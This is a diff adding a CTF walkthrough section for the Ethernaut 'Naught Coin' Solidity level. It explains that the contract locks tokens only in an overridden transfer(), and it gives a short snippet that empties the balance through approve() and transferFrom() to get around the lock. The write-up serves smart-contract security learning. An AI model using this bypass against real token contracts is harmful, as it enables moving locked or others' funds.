@@ -937,3 +937,37 @@ proxy;
 * https://docs.soliditylang.org/en/v0.8.19/yul.html#evm-dialect
 * https://ethereum.github.io/yellowpaper/paper.pdf
   * See "Contract Creation"
+
+## 15 Naught Coin
+
+To beat this level, we need to comply with
+
+```solidity
+instance.balanceOf(_player) == 0;
+```
+
+### Solution
+
+We see the writer of the `NaughtCoin` contract inherits from `ERC20` and overrides the [`transfer()` function](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/ERC20.sol#L113-L117)
+
+```solidity
+function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
+  super.transfer(_to, _value);
+}
+```
+
+Now, the [ERC20 interface](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/IERC20.sol) have other functions, namely [`transferFrom()`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/IERC20.sol#L77), which has not been overriden, therefore we can avoid the `lockTokens` modifier
+
+```solidity
+uint256 balance = nc.balanceOf(address(this));
+
+nc.approve(address(this), balance);
+nc.transferFrom(address(this), tx.origin, balance);
+```
+
+### References
+
+* https://eips.ethereum.org/EIPS/eip-20#transferfrom
+* https://docs.openzeppelin.com/contracts/4.x/erc20
+* https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/IERC20.sol
+* https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/ERC20.sol#L158-L163
